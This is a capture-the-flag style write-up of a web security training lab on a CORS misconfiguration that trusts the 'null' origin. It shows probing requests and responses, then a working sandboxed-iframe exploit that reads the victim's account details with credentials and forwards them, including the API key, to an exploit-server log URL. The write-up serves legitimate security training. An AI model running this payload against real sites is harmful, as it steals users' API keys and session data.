This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

According to https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin, The Origin header value may be null in a number of cases, including (non-exhaustively)
-  Origins whose scheme is not one of http, https, ftp, ws, wss, or gopher (including blob, file and data).
- Cross-origin images and media data, including that in <img>, `<video>` and `<audio>` elements.
- Documents created programmatically using createDocument(), generated from a data: URL, or that do not have a creator browsing context.
- Redirects across origins.
- iframes with a sandbox attribute that doesn't contain the value allow-same-origin.
- Responses that are network errors.
- Referrer-Policy set to no-referrer for non-cors request modes (e.g. simple form posts).


Login with wiener:peter

Observe GET /accountDetails request

```http
GET /accountDetails HTTP/2
Host: 0a180063033bf93a8020a34100f10061.web-security-academy.net
...
```

response
```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "ECAUAxXBHOgyn25gqKc57MDySXM1h7Y4",
  "sessions": [
    "hYmgDlci67bxvYyRwGg4FxpVphEZDd8c"
  ]
}
```
ACAC header indicates possible CORS support.

Add Origin header into request

```http
GET /accountDetails HTTP/2
Host: 0a180063033bf93a8020a34100f10061.web-security-academy.net
Origin: example.com
...
```

response
```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149
...
```
- No ACAO response header

Change origin to null

```http
GET /accountDetails HTTP/2
Host: 0a180063033bf93a8020a34100f10061.web-security-academy.net
Origin: null
...
```

response
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149
...
```
- ACAO reflection null

Origin is being reflected in response Access-Control-Allow-Origin header.

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin

Store exploit in exploit server:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a3900a903c3f9e68093a2a701f00036.exploit-server.net//log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
- exploit uses iframe as iframes with a sandbox attribute that doesn't contain the value allow-same-origin will use Origin: null by default.

Deliver exploit to victim and view access logs to get the response of the cross origin request to LAB/accountDetails
- submit API key from access log
